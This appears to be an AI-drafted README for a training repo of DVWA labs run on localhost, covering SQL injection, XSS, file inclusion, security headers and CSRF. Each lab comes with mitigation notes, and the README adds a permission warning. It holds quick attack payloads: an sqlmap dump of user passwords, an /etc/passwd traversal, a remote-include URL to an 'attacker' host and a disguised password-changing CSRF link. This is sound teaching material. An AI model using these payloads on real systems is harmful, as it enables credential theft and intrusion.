# Web-App Security 
A compact, copy-friendly README for your **web-app-security** repo.
Includes the five DVWA labs you created: **SQL Injection**, **XSS**, **File Inclusion**, **Web Security Headers**, and **CSRF** — with one-line descriptions, quick repro payloads/commands, and short mitigation notes. Use this as the repo `README.md`.

---

## What this repo contains

Small, hands-on demos for learning and testing common web vulnerabilities on **DVWA (low)** in a local lab.

### Labs

1. **SQL Injection** — extract DB data via injectable parameters.

   * Quick payload: `1 UNION SELECT user,password FROM users#`
   * Quick command (sqlmap):

     ```bash
     sqlmap -u "http://127.0.0.1/DVWA/vulnerabilities/sql/?id=18&Submit=Submit" \
       --cookie="PHPSESSID=<id>; security=low" -p id --batch --dump -T users -C user,password
     ```
   * Mitigation: parameterized queries (prepared statements), input validation, least-privilege DB user.

2. **Cross-Site Scripting (XSS)** — run attacker JS in victims’ browsers.

   * Stored payload: `<body onload=alert('test')>`
   * Reflected payload: `<script>alert("XSS Found");</script>`
   * Mitigation: contextual output encoding (e.g., `htmlspecialchars()`), CSP, auto-escaping templates.

3. **File Inclusion (LFI / RFI)** — read local files or include remote code.

   * LFI example: `?page=../../../../../../etc/passwd`
   * RFI example: `?page=http://attacker/csrf.html`
   * Mitigation: whitelist includes, `realpath()` checks, `allow_url_include=Off`, `open_basedir`, least privilege.

4. **Web Security Headers** — add headers to harden browsers.

   * Core headers to add in Apache:

     ```apache
     Header always set X-Frame-Options "SAMEORIGIN"
     Header set X-Content-Type-Options "nosniff"
     Header set Referrer-Policy "strict-origin-when-cross-origin"
     Header set Content-Security-Policy "default-src 'self'; script-src 'self'; object-src 'none'"
     Header set Permissions-Policy "geolocation=(), microphone=(), camera=()"
     ```
   * For TLS: `Strict-Transport-Security: max-age=31536000; includeSubDomains; preload`
   * Verify with: `curl -I http://127.0.0.1/dvwa`

5. **CSRF (Cross-Site Request Forgery)** — force authenticated actions via crafted links.

   * Example attacker link (changes password):

     ```html
     <a href="http://127.0.0.1/DVWA/vulnerabilities/csrf/?password_new=1234&password_conf=1234&Change=Change#">Movie 720p</a>
     ```
   * Mitigation: synchronizer CSRF tokens, `SameSite` cookies, require POST for state changes, Origin/Referer checks.

---

## Quick start (lab)

1. Boot Kali VM and start Apache + DVWA.
2. Log in to DVWA and set **Security: low**.
3. Run the lab you want (open relevant `/vulnerabilities/...` page).
4. Capture requests with browser DevTools / Burp for evidence.
5. Apply mitigations in a test copy and verify.

---

## Repo structure (suggested)

```
web-app-security/
├─ sql/        — DVWA-SQL-attack-and-mitigation.md
├─ xss/        — DVWA-XSS-attack-and-mitigation.md
├─ lfi-rfi/    — DVWA-LFI-RFI-attack-and-mitigation.md
├─ headers/    — DVWA-Web-Security-Headers.md
├─ csrf/       — DVWA-CSRF-attack-and-mitigation.md
└─ README.md   — (this file)
```

---

## Safety & ethics

⚠️ Only run these tests in your **own** lab or with explicit permission. Never test production or third-party systems without authorization.

---

## License

MIT — use for learning and teaching only.

---

Want this saved to the canvas as the repo `README.md` file (ready to push)? I can add it directly.
